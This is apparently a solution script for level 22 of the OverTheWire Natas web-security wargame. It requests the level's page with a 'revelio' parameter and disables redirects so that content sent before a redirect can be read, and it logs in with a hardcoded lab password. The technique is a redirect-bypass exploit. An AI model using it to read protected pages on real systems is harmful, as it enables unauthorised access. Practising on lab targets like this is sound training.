
import requests

url = "http://natas22.natas.labs.overthewire.org/?revelio"
auth = ("natas22","964laB0r7TuDqJj5b3HFtwsQoc0GhjBF")

r = requests.get(url=url,auth=auth,allow_redirects=False)
print(r.status_code)
print(r.text)